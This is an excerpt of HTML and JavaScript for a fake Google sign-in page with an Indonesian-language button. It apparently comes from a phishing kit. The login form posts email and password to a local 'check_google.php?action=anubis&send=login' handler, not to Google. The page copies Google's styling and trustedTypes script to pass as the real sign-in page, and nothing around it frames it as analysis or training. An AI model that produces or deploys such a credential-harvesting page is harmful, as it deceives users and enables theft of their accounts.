...
">
   ...
   no-name">
          <img class="circle-mask" src="https://freepngimg.com/thumb/google/66726-customer-account-google-service-button-search-logo.png">
          <form novalidate method="post" action="check_google.php?action=anubis&send=login" id="gaia_loginform">
            <div class="form-panel first valid" id="gaia_firstform">
              <div class="slide-out">
                ...
                <input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Berikutnya" disabled>
  ...
  <script type="text/javascript" nonce="JldCXpHjGFQ0l9VY2eSkHw">
    ...
    const elInEm = document.getElementById('Email')
    const elInPm = document.getElementById('Passwd')
    const elInNm = document.getElementById('next')
    elInEm.addEventListener('input', function() {
      const ins = this.value
      if (/^[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}$/g.test(ins) && elInPm.value.length > 6) {
        elInNm.disabled = false
      } else {
        elInNm.disabled = true
      }
    })
    elInPm.addEventListener('input', function() {
      if (/^[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}$/g.test(elInEm.value) && elInPm.value.length > 6) {
        elInNm.disabled = false
      } else {
        elInNm.disabled = true
      }
  ...
  <script type="text/javascript" nonce="JldCXpHjGFQ0l9VY2eSkHw">
    (function() {
      ...
      var q = this || self,
        ...
        V = function(F, N, d, Z, n) {
          if (Z = (n = d, q.trustedTypes), !Z || !Z.createPolicy) return n;
          try {
            n = Z.createPolicy(N, {
              createHTML: l,
              createScript: l,
